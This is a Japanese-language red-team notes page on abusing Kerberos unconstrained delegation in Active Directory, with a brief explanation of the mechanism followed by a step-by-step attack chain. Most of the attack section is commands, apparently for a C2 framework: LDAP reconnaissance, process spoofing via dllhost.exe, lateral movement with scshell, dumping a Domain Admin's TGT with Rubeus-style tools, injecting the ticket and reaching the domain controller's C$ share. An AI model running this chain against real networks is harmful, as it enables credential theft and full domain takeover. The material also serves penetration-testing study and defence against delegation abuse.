Kerberos委任は、**あるプリンシパルが別のプリンシパルの代わりにリソースへアクセスする**ための機能です。

典型的なシナリオ：

```
ユーザー ──認証──▶ フロントエンドWebアプリ ──代理アクセス──▶ バックエンドDB
```

問題は「WebサーバーがユーザーのパスワードもTGTも知らないのに、どうやってDBにそのユーザーとして認証するか」です。これを解決するのが委任機能です。

### Unconstrained Delegation の仕組み

#### 有効化フラグ
コンピュータオブジェクトの `UserAccountControl` に `TRUSTED_FOR_DELEGATION`（値：`524288`）フラグをセットすることで有効になります。

```
# LDAP で検索する場合
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))
```

> [!NOTE]
**ドメインコントローラは常にこのフラグが有効**

**Unconstrained Delegation フロー：**
```
クライアント ──TGS-REQ──▶ KDC
            ◀──TGS-REP──  KDC（ok-as-delegate フラグ付き）
                           ↓
               「このサーバーは委任を信頼されている」
                           ↓
クライアント ──AP-REQ──▶  サービス（サービスチケット ＋ TGTのコピーを送信）
                           ↓
               サービスがTGTをメモリにキャッシュ
               ↓
               後でユーザーの代理として任意のサービスチケットを取得可能
```

Unconstrained Delegationが設定されてるコンピュータを侵害した場合、メモリからTGTを抽出してそれらを使用して該当ユーザに代わってサービスチケットを要求することが可能

定期的にTGTを取得して表示するコマンド
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
```

↑終了するには
```
jobs
jobkill 0
```

# アタックケース

### 偵察

Unconstrained Delegationが設定されてるコンピュータを探す
```
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
```

### 横展開

Unconstrained Delegationが設定されているコンピュータに横展開
プロセスからコンピュータへのアクセス権があるユーザプロセスを窃取

spawn用のプロセスをdllhost.exeに設定
```
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
```

scshellを使用して移動
```
jump scshell64 lon-ws-1 smb
```

### 委任悪用

はいったらチケットをリスト
```
krb_triage
```

ユーザがDomain Adminであることを確認
```
ldapsearch samAccountName=dyork --attributes memberOf
```

特定ユーザのTGTチケットをダンプ
```
krb_dump /luid:<LUID> /service:krbtgt
krb_dump /user:dyork /service:krbtgt
```

### チケット悪用（トークン作成）

ファイルにチケットをかき出し。
```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\dyork.kirbi",[Convert]::FromBase64String("TGT"))
```

なりすまし用のトークン作成
```
make_token CONTOSO\dyork FakePass
```

ダンプしたチケットを利用
```
kerberos_ticket_use C:\Users\Attacker\Desktop\dyork.kirbi
```

DCにアクセス
```
ls \\lon-dc-1\c$\
```